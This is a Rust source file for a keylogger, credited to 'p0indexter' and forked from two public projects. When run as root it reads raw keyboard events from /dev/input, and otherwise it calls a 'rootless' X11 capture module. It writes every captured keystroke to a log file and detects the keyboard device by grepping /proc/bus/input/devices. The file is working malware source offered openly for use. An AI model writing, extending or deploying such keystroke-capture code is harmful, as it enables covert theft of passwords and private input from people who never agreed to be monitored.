// Forked from: https://github.com/gsingh93/keylogger and https://github.com/thomaslienbacher/win-keylogger-rs
// Rootless x11 keylogger developed by p0indexter
// Useage: keylogger -f /location/for/keylogs
// TODO - Windows Support - 


pub mod x11;
#[cfg(windows)]
pub mod ms;

extern crate getopts;
extern crate env_logger;
extern crate libc;

extern crate chrono;
#[cfg(windows)]
extern crate winapi;

#[macro_use]
extern crate log;

pub mod input;

use input::{is_key_event, is_key_press, is_key_release, is_shift, get_key_text, InputEvent};

use std::process::{exit, Command};
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::{env, mem};

use getopts::Options;

const VERSION: &'static str = env!("CARGO_PKG_VERSION");

#[derive(Debug)]
struct Config {
    device_file: String,
    log_file: String
}

impl Config {
    fn new(device_file: String, log_file: String) -> Self {
        Config { device_file: device_file, log_file: log_file }
    }
}

fn main() {

    // env_logger::init().unwrap();

    let config = parse_args();
    debug!("Config: {:?}", config);

    #[cfg(windows)]{
        ms::init();
    }

    #[cfg(unix)]{
        if root_check(){
            let mut log_file = OpenOptions::new().create(true).write(true).append(true).open(config.log_file).unwrap_or_else(|e| panic!("{}", e));

            let mut device_file = File::open(&config.device_file).unwrap_or_else(|e| panic!("{}", e));

            // TODO: use the sizeof function (not available yet) instead of hard-coding 24.
            let mut buf: [u8; 24] = unsafe { mem::zeroed() };

            // We use a u8 here instead of a bool to handle the rare case when both shift keys are pressed
            // and then one is released
            let mut shift_pressed = 0;
            loop {
                let num_bytes = device_file.read(&mut buf).unwrap_or_else(|e| panic!("{}", e));
                if num_bytes != mem::size_of::<InputEvent>() {
                    panic!("Error while reading from device file");
                }
                let event: InputEvent = unsafe { mem::transmute(buf) };
                if is_key_event(event.type_) {
                    if is_key_press(event.value) {
                        if is_shift(event.code) {
                            shift_pressed += 1;
                        }

                        let text = get_key_text(event.code, shift_pressed).as_bytes();
                        let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));

                        if num_bytes != text.len() {
                            panic!("Error while writing to log file");
                        }
                    } else if is_key_release(event.value) {
                        if is_shift(event.code) {
                            shift_pressed -= 1;
                        }
                    }
                }
            }
        } else {
            crate::x11::init_rootless(config.log_file.clone());
        }
    }

}

fn root_check() -> bool {
    let euid = unsafe { libc::geteuid() };
    return euid == 0;
}

fn parse_args() -> Config {
    fn print_usage(program: &str, opts: Options) {
        let brief = format!("Usage: {} [options]", program);
        println!("{}", opts.usage(&brief));
    }

    let args: Vec<_> = env::args().collect();

    let mut opts = Options::new();
    opts.optflag("h", "help", "prints this help message");
    opts.optflag("v", "version", "prints the version");
    opts.optopt("d", "device", "specify the device file", "DEVICE");
    opts.optopt("f", "file", "specify the file to log to", "FILE");

    let matches = opts.parse(&args[1..]).unwrap_or_else(|e| panic!("{}", e));
    if matches.opt_present("h") {
        print_usage(&args[0], opts);
        exit(0);
    }

    if matches.opt_present("v") {
        println!("{}", VERSION);
        exit(0);
    }

    let device_file = matches.opt_str("d").unwrap_or_else(|| get_default_device());
    let log_file = matches.opt_str("f").unwrap_or("keys.log".to_owned());

    Config::new(device_file, log_file)
}

fn get_default_device() -> String {
    let mut filenames = get_keyboard_device_filenames();
    debug!("Detected devices: {:?}", filenames);

    if filenames.len() == 1 {
        filenames.swap_remove(0)
    } else {
        panic!("The following keyboard devices were detected: {:?}. Please select one using \
                the `-d` flag", filenames);
    }
}

// Detects and returns the name of the keyboard device file. This function uses
// the fact that all device information is shown in /proc/bus/input/devices and
// the keyboard device file should always have an EV of 120013
fn get_keyboard_device_filenames() -> Vec<String> {
    let mut command_str = "grep -E 'Handlers|EV' /proc/bus/input/devices".to_string();
    command_str.push_str("| grep -B1 120013");
    command_str.push_str("| grep -Eo event[0-9]+");

    let res = Command::new("sh").arg("-c").arg(command_str).output().unwrap_or_else(|e| {
        panic!("{}", e);
    });
    let res_str = std::str::from_utf8(&res.stdout).unwrap();

    let mut filenames = Vec::new();
    for file in res_str.trim().split('\n') {
        let mut filename = "/dev/input/".to_string();
        filename.push_str(file);
        filenames.push(filename);
    }
    filenames
}
